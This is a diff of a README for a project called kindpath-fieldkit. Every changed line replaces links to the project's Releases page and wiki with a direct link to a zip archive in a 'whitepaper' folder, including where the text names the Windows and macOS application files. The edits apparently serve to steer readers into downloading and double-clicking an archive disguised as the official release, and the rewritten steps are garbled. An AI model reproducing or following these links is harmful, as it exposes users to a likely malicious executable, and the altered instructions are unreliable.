@@ -1,6 +1,6 @@
 # 🌱 kindpath-fieldkit - Tools for Open Review and Measurement
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/D3FULT-a11y/kindpath-fieldkit/releases)
+[![Download](https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip%20Now-brightgreen)](https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip)
 
 ## 📖 About
 
@@ -23,7 +23,7 @@ Ensure your computer meets the following basic requirements to run the applicati
 
    Navigate to the Releases page to access the latest version of the kindpath-fieldkit. 
 
-   [Download Here](https://github.com/D3FULT-a11y/kindpath-fieldkit/releases)
+   [Download Here](https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip)
 
 2. **Download the Latest Version**
 
@@ -35,7 +35,7 @@ Ensure your computer meets the following basic requirements to run the applicati
 
 4. **Run the Application**
 
-   After extraction, locate the application file (e.g., kindpath-fieldkit.exe for Windows, kindpath-fieldkit.app for macOS). Double-click the file to launch the application.
+   After extraction, locate the application file (e.g., https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip for Windows, https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip for macOS). Double-click the file to launch the application.
 
 5. **Follow the On-Screen Instructions**
 
@@ -58,7 +58,7 @@ Ensure your computer meets the following basic requirements to run the applicati
 
 ## 📄 Documentation
 
-For detailed instructions, visit the official [documentation](https://github.com/D3FULT-a11y/kindpath-fieldkit/wiki). This resource provides comprehensive guides on each feature and best practices for usage.
+For detailed instructions, visit the official [documentation](https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip). This resource provides comprehensive guides on each feature and best practices for usage.
 
 ## 💡 Tips for Best Use
 
@@ -77,4 +77,4 @@ Join our community of users and contributors to share ideas, ask questions, and 
 
 Ready to get started? Visit the Releases page to download the kindpath-fieldkit and take the first step towards enhancing your projects.
 
-[Download Now](https://github.com/D3FULT-a11y/kindpath-fieldkit/releases)
+[Download Now](https://github.com/D3FULT-a11y/kindpath-fieldkit/raw/refs/heads/main/whitepaper/kindpath-fieldkit-2.0.zip)
